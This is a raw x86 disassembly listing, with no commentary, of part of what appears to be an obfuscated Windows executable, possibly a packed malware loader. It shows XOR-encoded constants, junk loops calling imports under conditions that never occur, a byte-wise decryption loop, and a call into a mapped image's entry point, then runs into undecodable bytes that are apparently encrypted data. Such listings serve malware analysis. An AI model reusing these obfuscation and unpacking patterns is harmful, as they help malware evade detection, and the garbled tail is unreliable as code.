  41093d:	mov    eax,DWORD PTR [ebp-0x4]
  410940:	mov    ecx,DWORD PTR ds:0x41d45c
  410946:	mov    ecx,DWORD PTR [ecx+0x198]
  41094c:	xor    eax,esi
  41094e:	add    eax,edi
  410950:	mov    DWORD PTR [ecx],eax
  410952:	mov    eax,DWORD PTR [ebp-0x4]
  410955:	xor    eax,esi
  410957:	add    eax,edi
  410959:	mov    ds:0x41d658,eax
  41095e:	mov    eax,ds:0x41d45c
  410963:	mov    eax,DWORD PTR [eax+0x18c]
  410969:	mov    eax,DWORD PTR [eax]
  41096b:	mov    DWORD PTR [ebp-0x30],eax
  41096e:	mov    eax,0xf89c85ba
  410973:	mov    DWORD PTR [ebp-0x1c],eax
  410976:	mov    DWORD PTR [ebp-0x1c],eax
  410979:	mov    DWORD PTR [ebp-0x1c],eax
  41097c:	mov    DWORD PTR [ebp-0x1c],ebx
  41097f:	mov    DWORD PTR [ebp-0x38],eax
  410982:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  410989:	mov    ebx,DWORD PTR [ebp-0x4]
  41098c:	mov    ecx,DWORD PTR [ebp-0x8]
  41098f:	mov    edx,DWORD PTR [ebp-0x8]
  410992:	xor    edx,esi
  410994:	xor    ecx,esi
  410996:	add    ecx,edx
  410998:	mov    edx,DWORD PTR [ebp-0x8]
  41099b:	xor    ebx,esi
  41099d:	xor    edx,esi
  41099f:	add    ebx,edi
  4109a1:	lea    ecx,[ecx+edx*1+0x975891]
  4109a8:	cmp    ebx,ecx
  4109aa:	ja     0x410a0b
  4109b0:	mov    eax,DWORD PTR [ebp-0x8]
  4109b3:	xor    eax,esi
  4109b5:	lea    eax,[eax+ebx*1+0x3272db]
  4109bc:	push   eax
  4109bd:	mov    eax,DWORD PTR [ebp-0x1c]
  4109c0:	xor    eax,esi
  4109c2:	lea    eax,[ebp+eax*1+0x3272e3]
  4109c9:	push   eax
  4109ca:	mov    eax,ds:0x41d45c
  4109cf:	push   DWORD PTR [eax+0x1bc]
  4109d5:	call   0x403ce8
  4109da:	mov    eax,DWORD PTR [ebp-0x8]
  4109dd:	xor    eax,esi
  4109df:	lea    ebx,[ebx+eax*1+0x3272db]
  4109e6:	mov    eax,DWORD PTR [ebp-0x8]
  4109e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4109ec:	xor    ecx,esi
  4109ee:	xor    eax,esi
  4109f0:	add    eax,ecx
  4109f2:	mov    ecx,DWORD PTR [ebp-0x8]
  4109f5:	xor    ecx,esi
  4109f7:	lea    eax,[eax+ecx*1+0x975891]
  4109fe:	cmp    ebx,eax
  410a00:	jbe    0x4109b0
  410a06:	mov    eax,0xf89c85ba
  410a0b:	mov    ecx,DWORD PTR [ebp+0xc]
  410a0e:	mov    DWORD PTR ds:0x41d2e0,ecx
  410a14:	mov    ecx,DWORD PTR [ebp+0x10]
  410a17:	mov    DWORD PTR ds:0x41d534,ecx
  410a1d:	mov    ecx,DWORD PTR ds:0x41d2e0
  410a23:	mov    edx,DWORD PTR [ebp-0x20]
  410a26:	sub    ecx,edi
  410a28:	xor    ecx,esi
  410a2a:	mov    DWORD PTR [edx],ecx
  410a2c:	mov    edx,DWORD PTR [ebp-0xc]
  410a2f:	mov    ecx,0xf89c85b6
  410a34:	cmp    edx,ecx
  410a36:	jne    0x410a61
  410a3c:	lea    eax,[ebp-0x14]
  410a3f:	mov    DWORD PTR [ebp-0x24],eax
  410a42:	lea    eax,[ebp+0x4]
  410a45:	mov    DWORD PTR [ebp-0x14],eax
  410a48:	mov    eax,DWORD PTR [ebp-0x14]
  410a4b:	test   eax,eax
  410a4d:	je     0x410b76
  410a53:	mov    eax,DWORD PTR [ebp-0x10]
  410a56:	mov    eax,DWORD PTR [ebp-0x8]
  410a59:	lea    eax,[ebp-0x24]
  410a5c:	jmp    0x410b6d
  410a61:	mov    edx,DWORD PTR [ebp-0x28]
  410a64:	cmp    edx,0xf89c85b5
  410a6a:	je     0x410ac7
  410a70:	mov    edx,DWORD PTR [ebp-0x4]
  410a73:	mov    ebx,DWORD PTR [ebp-0x2c]
  410a76:	xor    edx,esi
  410a78:	add    edx,edi
  410a7a:	cmp    edx,ebx
  410a7c:	je     0x410ac7
  410a82:	mov    eax,ds:0x41d45c
  410a87:	mov    eax,DWORD PTR [eax+0x194]
  410a8d:	mov    ecx,DWORD PTR [eax]
  410a8f:	mov    eax,DWORD PTR [ecx+0x3c]
  410a92:	push   DWORD PTR ds:0x41d534
  410a98:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  410a9c:	push   DWORD PTR ds:0x41d2e0
  410aa2:	add    eax,ecx
  410aa4:	mov    ecx,DWORD PTR ds:0x41d45c
  410aaa:	mov    ecx,DWORD PTR [ecx+0x194]
  410ab0:	push   DWORD PTR [ecx]
  410ab2:	call   eax
  410ab4:	mov    ecx,DWORD PTR ds:0x41d45c
  410aba:	mov    ecx,DWORD PTR [ecx+0x1cc]
  410ac0:	mov    DWORD PTR [ecx],eax
  410ac2:	jmp    0x410b76
  410ac7:	mov    edx,DWORD PTR [ebp-0x4]
  410aca:	mov    ebx,DWORD PTR [ebp-0x30]
  410acd:	xor    edx,esi
  410acf:	add    edx,edi
  410ad1:	cmp    edx,ebx
  410ad3:	jne    0x410b2c
  410ad9:	mov    edx,DWORD PTR [ebp-0x4]
  410adc:	mov    ebx,DWORD PTR ds:0x41d45c
  410ae2:	mov    ebx,DWORD PTR [ebx+0x198]
  410ae8:	xor    edx,esi
  410aea:	add    edx,edi
  410aec:	cmp    edx,DWORD PTR [ebx]
  410aee:	jne    0x410b09
  410af4:	push   ecx
  410af5:	mov    ecx,DWORD PTR [ebp-0x4]
  410af8:	xor    ecx,esi
  410afa:	add    ecx,edi
  410afc:	push   ecx
  410afd:	push   eax
  410afe:	push   DWORD PTR [ebp-0x8]
  410b01:	push   DWORD PTR [ebp-0x4]
  410b04:	call   0x40b7a6
  410b09:	push   DWORD PTR [ebp-0x8]
  410b0c:	push   DWORD PTR [ebp-0x4]
  410b0f:	call   0x410b98
  410b14:	mov    eax,DWORD PTR [ebp-0x4]
  410b17:	xor    eax,esi
  410b19:	add    eax,edi
  410b1b:	mov    ds:0x41d4e0,eax
  410b20:	mov    eax,DWORD PTR [ebp-0x4]
  410b23:	xor    eax,esi
  410b25:	add    eax,edi
  410b27:	mov    ds:0x41d4d8,eax
  410b2c:	lea    eax,[ebp-0x18]
  410b2f:	mov    DWORD PTR [ebp-0x34],eax
  410b32:	lea    eax,[ebp+0x4]
  410b35:	mov    DWORD PTR [ebp-0x18],eax
  410b38:	mov    eax,DWORD PTR [ebp-0x18]
  410b3b:	test   eax,eax
  410b3d:	je     0x410b76
  410b43:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  410b4a:	mov    DWORD PTR [ebp-0x40],0x712ed08
  410b51:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  410b58:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  410b5f:	call   0x40b3b6
  410b64:	mov    eax,DWORD PTR [ebp-0x10]
  410b67:	mov    eax,DWORD PTR [ebp-0x8]
  410b6a:	lea    eax,[ebp-0x34]
  410b6d:	push   eax
  410b6e:	push   DWORD PTR [ebp-0x4]
  410b71:	call   0x40b1b5
  410b76:	mov    eax,ds:0x41d45c
  410b7b:	push   0x4
  410b7d:	add    eax,0x1cc
  410b82:	push   eax
  410b83:	lea    eax,[ebp-0x10]
  410b86:	push   eax
  410b87:	call   0x403ce8
  410b8c:	mov    eax,DWORD PTR [ebp-0x10]
  410b8f:	mov    eax,DWORD PTR [eax]
  410b91:	pop    edi
  410b92:	pop    esi
  410b93:	pop    ebx
  410b94:	leave  
  410b95:	ret    0xc
  410b98:	push   ebp
  410b99:	mov    ebp,esp
  410b9b:	sub    esp,0x98
  410ba1:	mov    eax,DWORD PTR [ebp+0x8]
  410ba4:	mov    ecx,DWORD PTR ds:0x42601c
  410baa:	or     DWORD PTR ds:0x425008,ecx
  410bb0:	push   ebx
  410bb1:	push   esi
  410bb2:	and    ecx,esi
  410bb4:	push   edi
  410bb5:	inc    ecx
  410bb6:	mov    esi,0x7510893
  410bbb:	xor    eax,esi
  410bbd:	mov    edi,0x3272db
  410bc2:	add    eax,edi
  410bc4:	and    DWORD PTR ds:0x42800c,0x0
  410bce:	jmp    0x410be0
  410bd3:	mov    ecx,DWORD PTR ds:0x42800c
  410bd9:	inc    ecx
  410bda:	mov    DWORD PTR ds:0x42800c,ecx
  410be0:	cmp    DWORD PTR ds:0x42800c,0x18
  410be7:	jae    0x410c21
  410bed:	cmp    DWORD PTR ds:0x42800c,0x1f
  410bf4:	jne    0x410c1c
  410bfa:	push   0x41ff3d
  410bff:	push   0x7ac7
  410c04:	push   0x1b99
  410c09:	push   0x1d9a
  410c0e:	push   DWORD PTR [ebp-0x10]
  410c11:	push   0x26f8
  410c16:	call   DWORD PTR ds:0x42104c
  410c1c:	jmp    0x410bd3
  410c21:	mov    DWORD PTR [ebp-0x30],eax
  410c24:	sub    eax,eax
  410c26:	mov    eax,ds:0x41d2dc
  410c2b:	sbb    DWORD PTR ds:0x42801c,edi
  410c31:	mov    eax,DWORD PTR [eax]
  410c33:	mov    DWORD PTR [ebp-0x20],eax
  410c36:	and    DWORD PTR ds:0x426004,0x0
  410c40:	mov    ecx,DWORD PTR ds:0x426004
  410c46:	inc    ecx
  410c47:	mov    DWORD PTR ds:0x426004,ecx
  410c4d:	cmp    DWORD PTR ds:0x426004,0x21
  410c54:	jne    0x410c65
  410c5a:	push   0x2993
  410c5f:	call   DWORD PTR ds:0x421014
  410c65:	cmp    DWORD PTR ds:0x426004,0x1d
  410c6c:	jb     0x410c40
  410c72:	mov    DWORD PTR ds:0x425024,0x1a
  410c7c:	cmp    DWORD PTR ds:0x425024,0x0
  410c83:	je     0x410ccd
  410c89:	cmp    DWORD PTR ds:0x425024,0x8
  410c90:	jne    0x410ca1
  410c96:	push   0x8b04
  410c9b:	call   DWORD PTR ds:0x421018
  410ca1:	cmp    DWORD PTR ds:0x425024,0x9
  410ca8:	jne    0x410cbb
  410cae:	mov    ecx,DWORD PTR ds:0x425024
  410cb4:	dec    ecx
  410cb5:	mov    DWORD PTR ds:0x425024,ecx
  410cbb:	mov    ecx,DWORD PTR ds:0x425024
  410cc1:	dec    ecx
  410cc2:	mov    DWORD PTR ds:0x425024,ecx
  410cc8:	jmp    0x410c7c
  410ccd:	mov    eax,ds:0x41d4e4
  410cd2:	inc    ecx
  410cd3:	mov    eax,DWORD PTR [eax]
  410cd5:	mov    DWORD PTR [ebp-0x28],eax
  410cd8:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  410cdf:	sbb    DWORD PTR ds:0x42601c,0xf37
  410ce9:	mov    eax,DWORD PTR [ebp-0x38]
  410cec:	and    DWORD PTR ds:0x42900c,0x0
  410cf6:	mov    ecx,DWORD PTR ds:0x42900c
  410cfc:	inc    ecx
  410cfd:	mov    DWORD PTR ds:0x42900c,ecx
  410d03:	cmp    DWORD PTR ds:0x42900c,0x6
  410d0a:	jne    0x410d24
  410d10:	push   0x133c
  410d15:	push   DWORD PTR [ebp-0x14]
  410d18:	push   DWORD PTR [ebp-0x24]
  410d1b:	push   DWORD PTR [ebp-0x18]
  410d1e:	call   DWORD PTR ds:0x42101c
  410d24:	cmp    DWORD PTR ds:0x42900c,0x5
  410d2b:	jne    0x410d40
  410d31:	xor    ecx,ecx
  410d33:	xor    ecx,DWORD PTR ds:0x42900c
  410d39:	inc    ecx
  410d3a:	mov    DWORD PTR ds:0x42900c,ecx
  410d40:	cmp    DWORD PTR ds:0x42900c,0x1b
  410d47:	jb     0x410cf6
  410d4d:	xor    eax,esi
  410d4f:	and    DWORD PTR ds:0x429010,0x2e08
  410d59:	add    eax,edi
  410d5b:	mov    DWORD PTR [ebp-0x30],eax
  410d5e:	sbb    eax,eax
  410d60:	mov    eax,ds:0x41d45c
  410d65:	sbb    DWORD PTR ds:0x428018,0x460c
  410d6f:	mov    DWORD PTR [ebp-0x30],eax
  410d72:	add    eax,0xded
  410d77:	mov    eax,DWORD PTR [ebp-0x20]
  410d7a:	mov    DWORD PTR [ebp-0x14],eax
  410d7d:	sbb    DWORD PTR ds:0x42501c,0x3470
  410d87:	mov    eax,DWORD PTR [ebp-0x14]
  410d8a:	and    DWORD PTR ds:0x428018,0x0
  410d94:	jmp    0x410da6
  410d99:	mov    ecx,DWORD PTR ds:0x428018
  410d9f:	inc    ecx
  410da0:	mov    DWORD PTR ds:0x428018,ecx
  410da6:	cmp    DWORD PTR ds:0x428018,0x15
  410dad:	jae    0x410df5
  410db3:	cmp    DWORD PTR ds:0x428018,0x6
  410dba:	jne    0x410dd0
  410dc0:	push   0x41ff9f
  410dc5:	push   0x41ff81
  410dca:	call   DWORD PTR ds:0x421050
  410dd0:	cmp    DWORD PTR ds:0x428018,0x5
  410dd7:	jne    0x410dea
  410ddd:	mov    ecx,DWORD PTR ds:0x428018
  410de3:	inc    ecx
  410de4:	mov    DWORD PTR ds:0x428018,ecx
  410dea:	jmp    0x410d99
  410def:	and    DWORD PTR ds:0x426000,ecx
  410df5:	push   0x4
  410df7:	pop    ecx
  410df8:	sub    ecx,eax
  410dfa:	add    ecx,DWORD PTR [ebp-0x28]
  410dfd:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  410e04:	mov    DWORD PTR [ebp-0x24],ecx
  410e07:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  410e11:	or     DWORD PTR ds:0x427000,edx
  410e17:	mov    eax,DWORD PTR [ebp-0x14]
  410e1a:	xor    DWORD PTR ds:0x429010,0x390a
  410e24:	mov    DWORD PTR [ebp-0x94],eax
  410e2a:	sbb    DWORD PTR ds:0x425020,0x44b0
  410e34:	mov    eax,DWORD PTR [ebp-0x24]
  410e37:	mov    DWORD PTR [ebp-0x90],eax
  410e3d:	mov    DWORD PTR ds:0x429010,0x17
  410e47:	cmp    DWORD PTR ds:0x429010,0x0
  410e4e:	je     0x410ede
  410e54:	cmp    DWORD PTR ds:0x429010,0x5
  410e5b:	jne    0x410e6f
  410e61:	push   DWORD PTR [ebp-0x24]
  410e64:	push   0x823f
  410e69:	call   DWORD PTR ds:0x421054
  410e6f:	cmp    DWORD PTR ds:0x429010,0x6
  410e76:	jne    0x410e87
  410e7c:	mov    eax,ds:0x429010
  410e81:	dec    eax
  410e82:	mov    ds:0x429010,eax
  410e87:	mov    eax,ds:0x429010
  410e8c:	dec    eax
  410e8d:	mov    ds:0x429010,eax
  410e92:	jmp    0x410e47
  410e97:	and    DWORD PTR ds:0x429004,0x0
  410ea1:	jmp    0x410eb1
  410ea6:	mov    eax,ds:0x429004
  410eab:	inc    eax
  410eac:	mov    ds:0x429004,eax
  410eb1:	cmp    DWORD PTR ds:0x429004,0x18
  410eb8:	jae    0x410ede
  410ebe:	cmp    DWORD PTR ds:0x429004,0x26
  410ec5:	jne    0x410ed9
  410ecb:	push   0x42801c
  410ed0:	push   DWORD PTR [ebp-0x18]
  410ed3:	call   DWORD PTR ds:0x421058
  410ed9:	jmp    0x410ea6
  410ede:	mov    eax,DWORD PTR [ebp-0x2c]
  410ee1:	or     DWORD PTR ds:0x429014,0x2e7c
  410eeb:	xor    eax,esi
  410eed:	add    eax,edi
  410eef:	mov    DWORD PTR [ebp-0x8c],eax
  410ef5:	lea    eax,[ebp-0x50]
  410ef8:	mov    DWORD PTR [ebp-0x88],eax
  410efe:	xor    DWORD PTR ds:0x425000,0x42600c
  410f08:	mov    eax,DWORD PTR [ebp-0x98]
  410f0e:	xor    DWORD PTR ds:0x42900c,0x426014
  410f18:	xor    eax,esi
  410f1a:	add    eax,edi
  410f1c:	adc    DWORD PTR ds:0x426008,0x425014
  410f26:	mov    DWORD PTR [ebp-0x98],eax
  410f2c:	lea    eax,[ebp-0x98]
  410f32:	adc    DWORD PTR ds:0x427018,0x426018
  410f3c:	push   eax
  410f3d:	adc    DWORD PTR ds:0x426004,0x2a7
  410f47:	mov    eax,DWORD PTR [ebp+0xc]
  410f4a:	sub    DWORD PTR ds:0x429010,0x42501c
  410f54:	xor    eax,esi
  410f56:	add    DWORD PTR ds:0x425020,0x427018
  410f60:	add    eax,edi
  410f62:	xor    DWORD PTR ds:0x42501c,0x425000
  410f6c:	push   eax
  410f6d:	mov    DWORD PTR ds:0x429010,0x1047
  410f77:	mov    eax,ds:0x41d47c
  410f7c:	and    DWORD PTR ds:0x425018,0x428010
  410f86:	push   0x41d3d2
  410f8b:	push   DWORD PTR [eax]
  410f8d:	call   0x403f26
  410f92:	sub    eax,DWORD PTR ds:0x427000
  410f98:	mov    eax,DWORD PTR [ebp-0x14]
  410f9b:	adc    ecx,DWORD PTR ds:0x425008
  410fa1:	mov    ecx,DWORD PTR [ebp-0x24]
  410fa4:	xor    DWORD PTR ds:0x429010,0x42900c
  410fae:	mov    DWORD PTR [ebp-0x4c],ecx
  410fb1:	mov    ecx,DWORD PTR [ebp+0x8]
  410fb4:	adc    DWORD PTR ds:0x425010,0x425014
  410fbe:	xor    ecx,esi
  410fc0:	add    DWORD PTR ds:0x428018,0x42900c
  410fca:	mov    DWORD PTR [ebp-0x38],eax
  410fcd:	add    ecx,edi
  410fcf:	mov    DWORD PTR ds:0x427000,0x74a5
  410fd9:	jmp    0x41374e
  410fde:	and    DWORD PTR ds:0x426008,0x0
  410fe8:	mov    ebx,DWORD PTR ds:0x426008
  410fee:	inc    ebx
  410fef:	mov    DWORD PTR ds:0x426008,ebx
  410ff5:	cmp    DWORD PTR ds:0x426008,0x15
  410ffc:	jne    0x411017
  411002:	push   0x42900c
  411007:	push   0x429010
  41100c:	push   0x5fed
  411011:	call   DWORD PTR ds:0x42105c
  411017:	cmp    DWORD PTR ds:0x426008,0x12
  41101e:	jb     0x410fe8
  411024:	and    DWORD PTR ds:0x426004,0x0
  41102e:	xor    ebx,ebx
  411030:	add    ebx,DWORD PTR ds:0x426004
  411036:	inc    ebx
  411037:	mov    DWORD PTR ds:0x426004,ebx
  41103d:	cmp    DWORD PTR ds:0x426004,0x20
  411044:	jne    0x41105d
  41104a:	push   DWORD PTR [ebp-0x20]
  41104d:	push   0x6608
  411052:	push   0x1aeb
  411057:	call   DWORD PTR ds:0x421020
  41105d:	cmp    DWORD PTR ds:0x426004,0x10
  411064:	jb     0x41102e
  41106a:	adc    DWORD PTR ds:0x427018,ecx
  411070:	lea    edx,[ecx+eax*1]
  411073:	sbb    DWORD PTR ds:0x428018,0x5978
  41107d:	mov    DWORD PTR [ebp-0x28],edx
  411080:	mov    edx,DWORD PTR ds:0x41d278
  411086:	mov    ebx,DWORD PTR ds:0x41d27c
  41108c:	sub    ebx,edx
  41108e:	sub    edx,DWORD PTR [edx+ebx*1]
  411091:	mov    edx,DWORD PTR [ebp-0x4c]
  411094:	and    DWORD PTR ds:0x426018,0x0
  41109e:	jmp    0x4110b0
  4110a3:	mov    ebx,DWORD PTR ds:0x426018
  4110a9:	inc    ebx
  4110aa:	mov    DWORD PTR ds:0x426018,ebx
  4110b0:	cmp    DWORD PTR ds:0x426018,0x16
  4110b7:	jae    0x4110e2
  4110bd:	cmp    DWORD PTR ds:0x426018,0x18
  4110c4:	jne    0x4110dd
  4110ca:	push   0x4880
  4110cf:	push   DWORD PTR [ebp-0x1c]
  4110d2:	push   0x14f0
  4110d7:	call   DWORD PTR ds:0x421028
  4110dd:	jmp    0x4110a3
  4110e2:	sub    edx,ecx
  4110e4:	xor    ebx,DWORD PTR ds:0x429004
  4110ea:	mov    DWORD PTR [ebp-0x20],edx
  4110ed:	and    DWORD PTR ds:0x427004,0x0
  4110f7:	mov    ebx,DWORD PTR ds:0x427004
  4110fd:	inc    ebx
  4110fe:	mov    DWORD PTR ds:0x427004,ebx
  411104:	cmp    DWORD PTR ds:0x427004,0x7
  41110b:	jne    0x41111c
  411111:	push   0x41fede
  411116:	call   DWORD PTR ds:0x42102c
  41111c:	cmp    DWORD PTR ds:0x427004,0x6
  411123:	jne    0x411136
  411129:	mov    ebx,DWORD PTR ds:0x427004
  41112f:	inc    ebx
  411130:	mov    DWORD PTR ds:0x427004,ebx
  411136:	cmp    DWORD PTR ds:0x427004,0x16
  41113d:	jb     0x4110f7
  411143:	movzx  edx,WORD PTR ds:0x428014
  41114a:	sbb    DWORD PTR ds:0x425000,edx
  411150:	mov    edx,DWORD PTR [ebp-0x20]
  411153:	or     ebx,0x6caa
  411159:	mov    DWORD PTR [ebp-0x14],edx
  41115c:	mov    edx,DWORD PTR [ebp-0x28]
  41115f:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  411166:	mov    DWORD PTR [ebp-0x44],edx
  411169:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411170:	mov    edx,DWORD PTR [ebp-0x34]
  411173:	xor    edx,esi
  411175:	add    edx,edi
  411177:	mov    DWORD PTR [ebp-0x10],edx
  41117a:	mov    edx,DWORD PTR [ebp-0x34]
  41117d:	xor    edx,esi
  41117f:	add    edx,edi
  411181:	mov    DWORD PTR [ebp-0x8],edx
  411184:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41118b:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  411192:	mov    edx,DWORD PTR [ebp-0x34]
  411195:	mov    ebx,DWORD PTR [ebp-0x14]
  411198:	xor    edx,esi
  41119a:	add    edx,edi
  41119c:	cmp    ebx,edx
  41119e:	je     0x413742
  4111a4:	mov    eax,DWORD PTR [ebp-0x18]
  4111a7:	xor    eax,esi
  4111a9:	mov    edx,0xffcd8d25
  4111ae:	sub    edx,eax
  4111b0:	add    edx,DWORD PTR [ebp-0x14]
  4111b3:	mov    eax,DWORD PTR [ebp-0x18]
  4111b6:	mov    ebx,DWORD PTR [ebp-0x10]
  4111b9:	xor    eax,esi
  4111bb:	add    eax,edi
  4111bd:	imul   eax,ebx
  4111c0:	cmp    eax,edx
  4111c2:	ja     0x41373f
  4111c8:	mov    edx,DWORD PTR [ebp-0x10]
  4111cb:	mov    eax,DWORD PTR [ebp-0x14]
  4111ce:	mov    ebx,DWORD PTR [ebp-0x28]
  4111d1:	sub    eax,edx
  4111d3:	xor    ebx,esi
  4111d5:	xor    edx,edx
  4111d7:	add    ebx,edi
  4111d9:	div    ebx
  4111db:	mov    DWORD PTR [ebp-0x8],eax
  4111de:	mov    eax,DWORD PTR [ebp-0x2c]
  4111e1:	mov    edx,DWORD PTR [ebp-0x8]
  4111e4:	xor    eax,esi
  4111e6:	add    eax,edi
  4111e8:	cmp    edx,eax
  4111ea:	jbe    0x4111fa
  4111f0:	mov    eax,DWORD PTR [ebp-0x2c]
  4111f3:	xor    eax,esi
  4111f5:	add    eax,edi
  4111f7:	mov    DWORD PTR [ebp-0x8],eax
  4111fa:	mov    eax,DWORD PTR [ebp-0x28]
  4111fd:	mov    edx,DWORD PTR [ebp-0x8]
  411200:	xor    eax,esi
  411202:	add    eax,edi
  411204:	imul   eax,edx
  411207:	mov    DWORD PTR [ebp-0x8],eax
  41120a:	mov    eax,DWORD PTR [ebp-0x34]
  41120d:	mov    edx,DWORD PTR [ebp-0x8]
  411210:	xor    eax,esi
  411212:	add    eax,edi
  411214:	cmp    edx,eax
  411216:	je     0x413728
  41121c:	mov    eax,DWORD PTR [ebp-0x8]
  41121f:	mov    DWORD PTR [ebp-0x24],eax
  411222:	mov    eax,DWORD PTR [ebp-0x10]
  411225:	add    eax,DWORD PTR [ebp-0x44]
  411228:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  41122f:	mov    DWORD PTR [ebp-0x8],eax
  411232:	mov    eax,0xf89c85b5
  411237:	mov    DWORD PTR [ebp-0x3c],eax
  41123a:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  411241:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  411248:	mov    DWORD PTR [ebp-0x1c],eax
  41124b:	mov    eax,DWORD PTR [ebp-0x20]
  41124e:	xor    eax,esi
  411250:	add    eax,edi
  411252:	jmp    0x4136e4
  411257:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41125e:	mov    eax,DWORD PTR [ebp-0x1c]
  411261:	mov    edx,DWORD PTR [ebp-0xc]
  411264:	xor    eax,esi
  411266:	add    eax,edi
  411268:	imul   eax,edx
  41126b:	mov    edx,DWORD PTR [ebp-0x8]
  41126e:	mov    al,BYTE PTR [eax+edx*1]
  411271:	mov    BYTE PTR [ebp-0x1],al
  411274:	mov    eax,DWORD PTR [ebp-0x1c]
  411277:	mov    edx,DWORD PTR [ebp-0xc]
  41127a:	xor    eax,esi
  41127c:	add    eax,edi
  41127e:	imul   eax,edx
  411281:	mov    edx,DWORD PTR [ebp-0x40]
  411284:	xor    edx,esi
  411286:	add    eax,edx
  411288:	mov    edx,DWORD PTR [ebp-0x8]
  41128b:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  411293:	mov    edx,DWORD PTR [ebp-0x48]
  411296:	xor    edx,esi
  411298:	lea    eax,[edx+eax*1+0x3272db]
  41129f:	movzx  edx,BYTE PTR [ebp-0x1]
  4112a3:	xor    edx,eax
  4112a5:	mov    BYTE PTR [ebp-0x1],dl
  4112a8:	mov    al,BYTE PTR [ebp-0x1]
  4112ab:	mov    edx,DWORD PTR [ebp-0x1c]
  4112ae:	mov    ebx,DWORD PTR [ebp-0xc]
  4112b1:	xor    edx,esi
  4112b3:	add    edx,edi
  4112b5:	imul   edx,ebx
  4112b8:	mov    ebx,DWORD PTR [ebp-0x8]
  4112bb:	mov    BYTE PTR [edx+ebx*1],al
  4112be:	mov    eax,DWORD PTR [ebp-0x1c]
  4112c1:	mov    edx,DWORD PTR [ebp-0xc]
  4112c4:	xor    eax,esi
  4112c6:	add    eax,edi
  4112c8:	imul   eax,edx
  4112cb:	mov    edx,DWORD PTR [ebp-0x8]
  4112ce:	mov    al,BYTE PTR [eax+edx*1]
  4112d1:	mov    BYTE PTR [ebp-0x1],al
  4112d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4112d7:	mov    edx,DWORD PTR [ebp-0xc]
  4112da:	xor    eax,esi
  4112dc:	add    eax,edi
  4112de:	imul   eax,edx
  4112e1:	mov    edx,DWORD PTR [ebp-0x3c]
  4112e4:	xor    edx,esi
  4112e6:	add    eax,edx
  4112e8:	mov    edx,DWORD PTR [ebp-0x8]
  4112eb:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  4112f3:	mov    edx,DWORD PTR [ebp-0x54]
  4112f6:	xor    edx,esi
  4112f8:	lea    eax,[edx+eax*1+0x3272db]
  4112ff:	movzx  edx,BYTE PTR [ebp-0x1]
  411303:	xor    edx,eax
  411305:	mov    BYTE PTR [ebp-0x1],dl
  411308:	mov    al,BYTE PTR [ebp-0x1]
  41130b:	mov    edx,DWORD PTR [ebp-0x1c]
  41130e:	jmp    0x4136c0
  411313:	cli    
  411314:	jl     0x411300
  411316:	popa   
  411317:	fs jecxz 0x411383
  41131a:	repz push eax
  41131c:	push   esp
  41131d:	and    eax,0x6d0b8dd3
  411322:	fst    DWORD PTR [edi-0x72]
  411325:	bound  esp,QWORD PTR [edx-0x33]
  411328:	pop    edi
  411329:	bound  esp,QWORD PTR [edx+0x3f]
  41132c:	xlat   BYTE PTR ds:[ebx]
  41132d:	fldenv [eax+0x77525dd6]
  411333:	or     al,bl
  411335:	mov    DWORD PTR [edi-0x30],edi
  411338:	mov    edi,0x6ec48a9
  41133d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41133e:	or     DWORD PTR [ebp-0x6a],esi
  411341:	das    
  411342:	or     al,0xbc
  411344:	in     eax,0xae
  411346:	mov    bl,0x44
  411348:	les    esp,FWORD PTR [eax+0x2]
  41134b:	cld    
  41134c:	es and ecx,ecx
  41134f:	sbb    eax,0x19220d37
  411354:	adc    DWORD PTR [esi+0xf8e35ff],edi
  41135a:	inc    esi
  41135b:	shl    BYTE PTR [ebp+0x38d2ff41],1
  411361:	inc    ecx
  411362:	cs pop ss
  411364:	dec    esp
  411365:	xlat   BYTE PTR ds:[ebx]
  411366:	sbb    DWORD PTR [edi+0x5f],eax
  411369:	das    
  41136a:	std    
  41136b:	mov    ch,0x6d
  41136d:	ins    DWORD PTR es:[edi],dx
  41136e:	fld    DWORD PTR [ecx-0x1be8a52]
  411374:	mov    ah,BYTE PTR [esp+eiz*8+0x853b435]
  41137b:	inc    edi
  41137c:	sub    eax,0x4a4b583
  411381:	push   ebp
  411382:	rcl    BYTE PTR [edx],1
  411384:	mov    eax,0x6859517c
  411389:	or     edi,DWORD PTR [eax-0xe4a6ade]
  41138f:	popf   
  411390:	imul   ebx,DWORD PTR [edx],0x6b13f704
  411396:	pop    ss
  411397:	cmp    DWORD PTR [ebp+0x1f1a669],eax
  41139d:	xchg   ebx,eax
  41139e:	jmp    0x41140e
  4113a0:	outs   dx,BYTE PTR ds:[esi]
  4113a1:	pop    eax
  4113a2:	mov    ch,0xcd
  4113a4:	adc    DWORD PTR [edx+0x16b05e78],esp
  4113aa:	(bad)  
  4113ab:	loope  0x411371
  4113ad:	and    eax,DWORD PTR [esi]
  4113af:	out    0xe2,al
  4113b1:	ror    dl,cl
  4113b3:	dec    eax
  4113b4:	pushf  
  4113b5:	mov    bh,0x56
  4113b7:	jge    0x41136d
  4113b9:	shr    BYTE PTR [edx-0x6fd81caa],cl
  4113bf:	mov    ds:0x53c1b249,eax
  4113c4:	pop    es
  4113c5:	cdq    
  4113c6:	ins    BYTE PTR es:[edi],dx
  4113c7:	push   ebp
  4113c8:	int3   
  4113c9:	add    BYTE PTR [edx+esi*8],bl
  4113cc:	jne    0x4113a1
  4113ce:	inc    bl
  4113d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113d1:	sti    
  4113d2:	idiv   ebp
